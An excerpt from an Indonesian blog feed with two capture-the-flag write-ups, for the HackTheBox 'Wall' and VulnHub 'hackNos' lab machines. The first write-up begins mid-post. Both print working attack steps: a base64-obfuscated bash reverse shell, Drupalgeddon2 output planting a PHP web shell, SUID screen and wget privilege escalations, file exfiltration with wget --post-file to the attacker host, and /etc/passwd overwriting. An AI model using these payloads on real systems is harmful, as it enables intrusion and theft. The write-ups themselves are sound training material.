&lt;p&gt;Setelah itu kita hanya perlu mengeksekusi script diatas dan kita akan mendapatkan password untuk login&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; bash brute.sh 
Username: admin
Password: password1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Oke karena sudah dapet credential untuk login, sekarang kita hanya perlu mengekseksui script exploit RCE (&lt;a href=&quot;https://www.exploit-db.com/exploits/47069&quot;&gt;CVE-2019-13024&lt;/a&gt;). Sayangya exploit tersebut gagal, setelah lihat &lt;del&gt;yang seger seger&lt;/del&gt; comment di forum, ternyata ada filter yang mencegah kita menginput character spasi. Maka saya membuat payload seperti berikut.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS44OC8xMzM3IDA+JjE7|base64${IFS}-d|bash;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Untuk script yang sudah saya modifikasi bisa diambil di &lt;a href=&quot;http://ix.io/23L9&quot;&gt;ix.io&lt;/a&gt;. Setelah itu kita hanya perlu menyiapkan listener &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -vlp 1337&lt;/code&gt; dan mengeksekusi script tersebut maka kita akan mendapat reverse shell.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; nc -vlp 1337
listening on [any] 1337 ...
10.10.10.157: inverse host lookup failed: Unknown host
connect to [10.10.15.88] from (UNKNOWN) [10.10.10.157] 32778
bash: cannot set terminal process group (1002): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Wall:/usr/local/centreon/www$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Akhirnya dapet reverse shell juga, sampai sini kita akan mencari cara untuk mendapatkan user. Pertama saya melakukan enumerating menggunakan &lt;a href=&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;&gt;LinEnum.sh&lt;/a&gt; dan ternyata mendapatkan sebuah SUID yang menarik.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dari sini saya menemukan sebuah exploit untuk binary diatas di &lt;a href=&quot;https://www.exploit-db.com/exploits/41154&quot;&gt;exploit-db&lt;/a&gt;. Langsung saja saya mencoba privilege escalation.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Wall:/tmp$ cd /etc
www-data@Wall:/etc$ umask 000
www-data@Wall:/etc$ screen -D -m -L ld.so.preload echo -ne  &quot;/tmp/libhax.so&quot;   
www-data@Wall:/etc$ screen -ls
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@Wall:/etc$ /tmp/rootshell
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)
# cat /root/root.txt
1fdbcf8c33eaa2599afdc52e1b4d5db7
# cat /home/shelby/user.txt
fe6194544f452f62dc905b12f8da8406
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dan akhirnya, sekali dayung 2 flag termiliki. Untuk lebih jelas mengenai &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/libhax.so&lt;/code&gt; dan &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/rootshell&lt;/code&gt; bisa dilihat di link exploit db diatas tadi.&lt;/p&gt;

&lt;p&gt;Oke selesai juga machine ini, dan semoga ga males untuk nulis writeup selanjutnya.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Ya, akhirnya machine Wall ini retired dan digantikan machine baru Resolute (Windows) dan sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP 10.10.10.157. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.</summary></entry><entry><title type="html">[VULNHUB] hackNos: Os-hackNos</title><link href="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html" rel="alternate" type="text/html" title="[VULNHUB] hackNos: Os-hackNos" /><published>2019-12-02T00:00:00+07:00</published><updated>2019-12-02T00:00:00+07:00</updated><id>http://bl33dz.github.io/2019/12/02/vulnhub-hacknos</id><content type="html" xml:base="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html">&lt;p&gt;My first vulnhub writeup, ya ini adalah writeup vulnhub pertama saya dan juga post pertama di blog ini. Sebenarnya saya sudah menulis beberapa writeup machine hackthebox namun karena machine tersebut belum retired jadi belum saya publish.&lt;/p&gt;

&lt;p&gt;Oke, hackNos ini adalah machine yg menggunakan os linux. Untuk info machine ini sendiri bisa diklik link berikut &lt;a href=&quot;https://www.vulnhub.com/entry/hacknos-os-hacknos,401/&quot;&gt;hackNos&lt;/a&gt; lalu download file OVA yg tersedia.&lt;/p&gt;

&lt;p&gt;Pertama, kita perlu menjalankan machine tersebut dengan VMWare atau VirtualBox dan untuk caranya bisa lihat di link berikut &lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/setup-practice-ctfs-from-vulnhub-kali-linux-0170228/&quot;&gt;nullbyte&lt;/a&gt;. Setelah di run kita perlu mengetahui ip machine tersebut menggunakan command nmap untuk meng-scan range ip tertentu. Karena disini saya menggunakan ip address 192.168.56.xxx maka saya melakukan scanning dengan command &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap 192.168.56.2-255&lt;/code&gt; dan saya mendapatkan ip &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.56.101&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Kemudian, paling utama sebelum melakukan pentesting kita perlu tau service apa saja yang tersedia. Kita dapat mengetahui service service yang menggunakan nmap.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/hackNos# nmap -sV -sC -sT 192.168.56.101
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-02 05:43 WIB
Nmap scan report for 192.168.56.101
Host is up (0.00048s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)
|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)
|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 08:00:27:70:EB:6C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Dari result diatas kita mendapatkan 2 port yaitu port ssh dan port http. Kita akan membuka port http lebih dulu karena biasanya vulnerability-nya terdapat pada web aplikasi machine tersebut. Dan mendapatkan tampilan web seperti dibawah ini.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnhub-1.png&quot; alt=&quot;vulnhub-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hal yang langsung ada dipikiran saya yaitu brute force directory. Disini saya akan menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; untuk melakukan brute forcing.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/hackNos# ffuf -w /root/htb/dir-small.txt -u http://192.168.56.101/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v0.12
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.101/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

drupal                  [Status: 301, Size: 317, Words: 20, Lines: 10]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Disini saya mendapatkan directory &lt;code class=&quot;highlighter-rouge&quot;&gt;drupal&lt;/code&gt; dan ketika saya lihat view-source dari website tersebut saya mendapati bahwa versi drupal tersebut adalah Drupal 7.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/vulnhub-2.png&quot; alt=&quot;vulnhub-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nah setelah tahu website tersebut menggunakan Drupal versi 7 saya mencoba mencari cari exploit. Setelah beberapa &lt;del&gt;tahun&lt;/del&gt; kali mencoba berbagai exploit saya menemukan salah satu exploit yang work (&lt;a href=&quot;https://github.com/dreadlocked/Drupalgeddon2/blob/master/drupalgeddon2.rb&quot;&gt;Exploit&lt;/a&gt;). Langsung saja saya meng-run exploit tersebut dan mendapatkan shell.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/hackNos# ruby drupalgeddon2.rb http://192.168.56.101/drupal/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.56.101/drupal/
--------------------------------------------------------------------------------
[+] Found  : http://192.168.56.101/drupal/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.57
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo VKFGMJXS
[+] Result : VKFGMJXS
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.56.101/drupal/shell.php)
[!] Response: HTTP 200 // Size: 5.   ***Something could already be there?***
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : &amp;lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&amp;gt;&amp;amp;1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.56.101/drupal/shell.php' -d 'c=hostname'
hackNos&amp;gt;&amp;gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Singkat cerita saya mendapatkan interactive shell (&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;Reverse Shell&lt;/a&gt;). Lalu saya mencoba masuk ke directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; dan menemukan user &lt;code class=&quot;highlighter-rouge&quot;&gt;james&lt;/code&gt;. Ketika saya melihat lihat isi folder user &lt;code class=&quot;highlighter-rouge&quot;&gt;james&lt;/code&gt; ternyata file &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; readable.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/vulnhub/hackNos# nc -vlp 1337
listening on [any] 1337 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 41176
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
www-data@hackNos:/var/www/html/drupal$ cd /home
cd /home
www-data@hackNos:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root  root  4096 Oct 31 17:23 .
drwxr-xr-x 22 root  root  4096 Oct 31 17:20 ..
drwxr-xr-x  3 james james 4096 Nov 16 21:28 james
www-data@hackNos:/home$ cd james
cd james
www-data@hackNos:/home/james$ ls -la
ls -la
total 40
drwxr-xr-x 3 james james 4096 Nov 16 21:28 .
drwxr-xr-x 3 root  root  4096 Oct 31 17:23 ..
-rw------- 1 james james 2609 Nov 16 21:34 .bash_history
-rw-r--r-- 1 james james  220 Oct 31 17:23 .bash_logout
-rw-r--r-- 1 james james 3771 Oct 31 17:23 .bashrc
drwx------ 2 james james 4096 Oct 31 17:24 .cache
-rw------- 1 root  root   127 Oct 31 17:41 .mysql_history
-rw-r--r-- 1 james james  655 Oct 31 17:23 .profile
-rw-r--r-- 1 james james    0 Oct 31 17:24 .sudo_as_admin_successful
-rw-rw-r-- 1 james james  175 Oct 31 17:59 .wget-hsts
-rw-r--r-- 1 root  root   357 Nov 16 21:28 user.txt
www-data@hackNos:/home/james$ cat user.txt
cat user.txt
   _                                  
  | |                                 
 / __) ______  _   _  ___   ___  _ __ 
 \__ \|______|| | | |/ __| / _ \| '__|
 (   /        | |_| |\__ \|  __/| |   
  |_|          \__,_||___/ \___||_|   
                                      
                                      

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
www-data@hackNos:/home/james$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Sampai sini kita telah mendapatkan flag user yaitu &lt;code class=&quot;highlighter-rouge&quot;&gt;bae11ce4f67af91fa58576c1da2aad4b&lt;/code&gt;. Lalu saya mencoba mendapatkan privesc untuk melihat flag root. Pertama, saya melakukan enumerating menggunakan &lt;a href=&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;&gt;LinEnum.sh&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 506200 May  9  2018 /usr/bin/wget
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Hasil dari enumeration menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; saya mendapatkan sesuatu yang menarik yaitu command &lt;code class=&quot;highlighter-rouge&quot;&gt;wget&lt;/code&gt; yang ternyata adalah SUID files. Setelah mencari referensi di google saya mencoba melihat file &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;wget&lt;/code&gt;. &lt;em&gt;Loh kok tau nama filenya?&lt;/em&gt;. Nebak aja, insting seorang dukun karena biasanya root flag letaknya disitu.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#### TARGET ####
www-data@hackNos:/tmp$ cat /root/root.txt
cat: /root/root.txt: Permission denied
www-data@hackNos:/tmp$ wget --post-file=/root/root.txt 192.168.56.1
--2019-12-02 05:09:08--  http://192.168.56.1/
Connecting to 192.168.56.1:80... connected.
HTTP request sent, awaiting response...

#### ATTACKER ####
root@kali:~/vulnhub/hackNos# nc -vlp 80
listening on [any] 80 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 32920
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.56.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 491

    _  _                              _   
  _| || |_                           | |  
 |_  __  _|______  _ __  ___    ___  | |_ 
  _| || |_|______|| '__|/ _ \  / _ \ | __|
 |_  __  _|       | |  | (_) || (_) || |_ 
   |_||_|         |_|   \___/  \___/  \__|
                                          
                                          

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Linkedin : https://www.linkedin.com/in/rahulgehlaut/

Blog : www.hackNos.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Dan file &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; akan dikirim menggunakan wget ke listener saya. Root flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;bae11ce4f67af91fa58576c1da2aad4b&lt;/code&gt;. Sebenarnya ada cara lain juga untuk mendapatkan user root. Berikut adalah langkah langkah untuk cara lainnya.&lt;/p&gt;

&lt;p&gt;Pertama, copy dulu semua isi &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; target ke local kita. Setelah itu kita generate password hash dengan command &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl passwd -1 -salt ruut pwnd&lt;/code&gt; dan mendapatkan output &lt;code class=&quot;highlighter-rouge&quot;&gt;$1$ruut$MOyAqyAAB6KZwan9qiHaO0&lt;/code&gt;. Lalu kita susun menjadi sebuah line seperti berikut.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ruut:$1$ruut$MOyAqyAAB6KZwan9qiHaO0:0:0:root:/root:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Baru kita masukkan line tersebut ke file &lt;code class=&quot;highlighter-rouge&quot;&gt;passwd&lt;/code&gt; yang telah kita copy ke local kita. Lalu jalankan &lt;code class=&quot;highlighter-rouge&quot;&gt;python -m SimpleHTTPServer&lt;/code&gt; pada local kita. Jika sudah kita hanya perlu meng-overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; target dengan file yang kita buat.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@hackNos:/tmp$ wget http://192.168.56.1:8000/passwd -O /etc/passwd
--2019-12-02 05:31:27--  http://192.168.56.1:8000/passwd
Connecting to 192.168.56.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1681 (1.6K) [application/octet-stream]
Saving to: '/etc/passwd'

/etc/passwd         100%[===================&amp;gt;]   1.64K  --.-KB/s    in 0s      

2019-12-02 05:31:27 (138 MB/s) - '/etc/passwd' saved [1681/1681]

www-data@hackNos:/tmp$ su ruut                                            
Password: pwnd
root@hackNos:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Login pada user &lt;code class=&quot;highlighter-rouge&quot;&gt;ruut&lt;/code&gt; menggunakan password &lt;code class=&quot;highlighter-rouge&quot;&gt;pwnd&lt;/code&gt; seperti yang kita generate menggunakan command &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; tadi dan kita akan mendapat user root.&lt;/p&gt;

&lt;p&gt;Nah selesai sudah machine ini dan tunggu next writeup di blog ini.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="vulnhub" /><category term="linux" /><category term="easy" /><summary type="html">My first vulnhub writeup, ya ini adalah writeup vulnhub pertama saya dan juga post pertama di blog ini. Sebenarnya saya sudah menulis beberapa writeup machine hackthebox namun karena machine tersebut belum retired jadi belum saya publish.</summary></entry></feed>